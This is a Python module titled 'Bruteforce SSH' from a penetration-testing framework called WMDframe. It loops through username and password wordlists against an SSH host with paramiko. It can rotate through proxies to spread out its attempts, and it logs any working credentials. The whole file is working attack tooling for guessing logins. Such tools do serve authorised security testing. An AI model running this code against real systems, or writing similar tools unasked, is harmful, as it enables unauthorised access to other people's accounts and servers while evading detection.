#!/usr/bin/env python3
#
# MIT - (c) 2016 ThomasTJ (TTJ)
# Module for WMDframe
#
# Todo:
# Nr of request with proxy before changing (user specified)
# Proxy is not working smoothly
#


import os
import paramiko
from time import sleep
from core.colors import bc as bc
import core.modules as cmodules
import core.commands as comm


# START Log files, global variables, etc.
connCounter = 0
# END Log files, global variables, etc.


# OPTIONS
class options():
    Author = 'Thomas TJ (TTJ)'
    Name = 'Bruteforce SSH'
    Call = 'bfssh'
    Modulename = 'bruteforcessh'
    Category = 'bruteforce'
    Type = 'ssh'  # sin = single action/program, aut = multiple programs combined for attack
    Version = '0.1'
    License = 'MIT'
    Description = 'Bruteforce SSH login'
    Datecreation = '2017/01/01'
    Lastmodified = '2017/01/01'

    def __init__(self, ip, port, userlist, passlist, timeout, logfile, proxyActive, proxyFile):
        self.ip = ip
        self.port = port
        self.userlist = userlist
        self.passlist = passlist
        self.timeout = timeout
        self.logfile = logfile
        self.proxyActive = proxyActive
        self.proxyFile = proxyFile
        self.show_all()

    # Possible options
    def poss_opt(self):
        return ('ip', 'port', 'userlist', 'passlist', 'timeout', 'logfile', 'proxyActive', 'proxyFile')

    # Show options
    def show_opt(self):
        print(
            ""
            + "\n\t" + bc.OKBLUE + ("%-*s %-*s %-*s %s" % (15, "OPTION", 8, "RQ", 18, "VALUE", "DESCRIPTION")) + bc.ENDC
            + "\n\t" + ("%-*s %-*s %-*s %s" % (15, "------", 8, "--", 18, "-----", "-----------"))
            + "\n\t" + ("%-*s %-*s %-*s %s" % (15, "ip:", 8, "y", 25, self.ip, "Path to userlist"))
            + "\n\t" + ("%-*s %-*s %-*s %s" % (15, "port:", 8, "y", 25, self.port, "Path to userlist"))
            + "\n\t" + ("%-*s %-*s %-*s %s" % (15, "userlist:", 8, "y", 25, self.userlist, "Path to userlist"))
            + "\n\t" + ("%-*s %-*s %-*s %s" % (15, "passlist:", 8, "y", 25, self.passlist, "Path to passwordlist"))
            + "\n\t" + ("%-*s %-*s %-*s %s" % (15, "timeout:", 8, "y", 25, self.timeout, 'Timeout for requests (using proxies can increase this!)'))
            + "\n\t" + ("%-*s %-*s %-*s %s" % (15, "logfile:", 8, "n", 25, self.logfile, 'Save positive results to logfile'))
            + "\n\t" + ("%-*s %-*s %-*s %s" % (15, "proxyActive:", 8, "n", 25, self.proxyActive, 'Activate proxy, increases BF time!! (y/n)'))
            + "\n\t" + ("%-*s %-*s %-*s %s" % (15, "proxyFile:", 8, "n", 25, self.proxyFile, 'Proxylist'))
            + "\n"
            + "\n\t" + bc.ITALIC + 'PROXY IS IN DEVELOPMENT' + bc.ENDC
            + "\n"
            )

    # Show commands
    def show_commands(self):
        print(
            ""
            + "\n\t" + bc.OKBLUE + "COMMANDS:" + bc.ENDC
            + "\n\t" + "---------"
            + "\n\t" + ("%-*s ->\t%s" % (9, "run", "Run the script"))
            + "\n\t" + ("%-*s ->\t%s" % (9, "info", "Information"))
            + "\n\t" + ("%-*s ->\t%s" % (9, "help", "Help"))
            + "\n\t" + ("%-*s ->\t%s" % (9, "so", "Show options"))
            + "\n\t" + ("%-*s ->\t%s" % (9, "sa", "Show module info"))
            + "\n\t" + ("%-*s ->\t%s" % (9, "exit", "Exit"))
            + "\n"
            )

    # Show all info
    def show_all(self):
        cmodules.showModuleData(
            options.Author,
            options.Name,
            options.Call,
            options.Category,
            options.Type,
            options.Version,
            options.Description,
            options.License,
            options.Datecreation,
            options.Lastmodified
            )
        self.show_commands()
        self.show_opt()
# END OPTIONS


def run():
    global connCounter
    # Check if logfile exists
    saveLogCheck()
    # Setting SSH
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    # Check if proxy is needed
    if sop.proxyActive == 'y':
        sock = getProxy()
    # Open user- and passlist and loop through them
    with open(sop.userlist, 'r') as fuser, open(sop.passlist, 'r') as fpass:
        for uline in fuser:
            for pline in fpass:
                if sop.proxyActive == 'y':
                    connCounter += 1
                    # !!!!!! Make userspecified conn count
                    if connCounter > 30:
                        sock = getProxy()
                        connCounter = 0
                    bf = bruteforce(ssh, uline.strip('\n'), pline.strip('\n'), sock)
                else:
                    bf = bruteforce(ssh, uline.strip('\n'), pline.strip('\n'), None)
                # Check the return:
                if bf == 'Corret':
                    positiveResult = (bc.OKGREEN + '\t[+]' + '  IP: ' + sop.ip + ' Port: ' + str(sop.port) + bc.ENDC + ' --> Username: ' + bc.BOLDULINE + uline.strip('\n') + bc.ENDC + ' and Password: ' + bc.BOLDULINE + pline.strip('\n') + bc.ENDC)
                    saveLog(positiveResult)
                    print(positiveResult)
                elif bf == 'Failed':
                    print(bc.WARN + '\t[-]' + bc.ENDC + '  Checking - U: ' + str(uline.strip('\n')) + ' P: ' + str(pline.strip('\n')) + '  --> ' + 'Not working..')
                elif bf == 'Break':
                    exitBF = input("\t->  " + bc.WARN + "wmd" + bc.ENDC + "@" + bc.WARN + "exit bruteforce (Y/n) or new proxy (p):" + bc.ENDC + " ")
                    if exitBF.lower() not in ('y', 'n', 'p'):
                        exitBF = 'y'
                    if exitBF == 'y':
                        return '\tExiting\n'
                    if exitBF == 'p':
                        sock = getProxy()
                else:
                    break
                sleep(float(sop.timeout))


def getProxy():
    from urllib.parse import urlparse
    import http.client
    proxy_uri = 'http://' + str(comm.getRandomProxy('http').get("http", None))
    url = urlparse(proxy_uri)
    http_con = http.client.HTTPConnection(url.hostname, url.port)
    headers = {}
    http_con.set_tunnel(url.hostname, url.port, headers)
    http_con.connect()
    sock = http_con.sock
    return sock


def bruteforce(ssh, bfusername, bfpassword, sock):
    try:
        if sop.proxyActive == 'y':
            ssh.connect(hostname=sop.ip, port=int(sop.port), username=bfusername, password=bfpassword, timeout=10, sock=sock)
        else:
            ssh.connect(hostname=sop.ip, port=int(sop.port), username=bfusername, password=bfpassword, timeout=10)
        ssh.close()
        return 'Corret'
    except (KeyboardInterrupt, SystemExit):
        return 'Break'
    except:
        return 'Failed'


def saveLogCheck():
    if sop.logfile:
        if not os.path.isfile(sop.logfile):
            os.mknod(sop.logfile)
        else:
            appendtofile = input("\t->  " + bc.WARN + "wmd" + bc.ENDC + "@" + bc.WARN + "logfile exists - append (Y/n):" + bc.ENDC + " ")
            if appendtofile.lower() not in ('y', 'n'):
                appendtofile = 'y'
            if appendtofile == 'n':
                print('\t[!] Exiting\n')
                return 'Exit'


def saveLog(data):
    if sop.logfile:
        with open(sop.logfile, 'a') as file:
            file.write(data + "\n")


# CONSOLE
def console():
    value = input("   -> " + bc.FAIL + "wmd" + bc.ENDC + "@" + bc.FAIL + "bfssh:" + bc.ENDC + " ")
    userinput = value.split()
    if 'so' in userinput[:1]:
        sop.show_opt()
    elif 'sa' in userinput[:1]:
        sop.show_all()
    elif 'run' in userinput[:1]:
        run()
    elif 'set' in userinput[:1]:
        useroption = str(userinput[1:2]).strip('[]\'')
        uservalue = str(userinput[2:3]).strip('[]\'')
        if useroption not in sop.poss_opt():
            print(bc.WARN + "\n    Error, no options for: " + useroption + "\n" + bc.ENDC)
        elif useroption in sop.poss_opt():
            setattr(sop, useroption, uservalue)
            print('\n      ' + useroption + '\t> ' + uservalue + "\n")
    elif 'back' in userinput[:1] or 'exit' in userinput[:1]:
        return None
    else:
        command = str(userinput[:1]).strip('[]\'')
        print(bc.WARN + "\n    Error, no options for: " + command + "\n" + bc.ENDC)
    console()
# END console


def main():
    print('\n')
    print('\t     ___  ____  __________ __  ')
    print('\t    / _ )/ __/ / __/ __/ // /  ')
    print('\t   / _  / _/  _\ \_\ \/ _  /   ')
    print('\t  /____/_/   /___/___/_//_/    ')
    print('\n')
    print('\t' + bc.OKBLUE + 'CHECKING REQUIREMENTS' + bc.ENDC)
    comm.checkNetConnectionV()
    comm.checkNetVPNV()
    print('')
    global sop
    sop = options('127.0.0.1', 22, 'files/user.txt', 'files/pwd_john.txt', '0.5', '', '', 'files/proxies.txt')
    console()
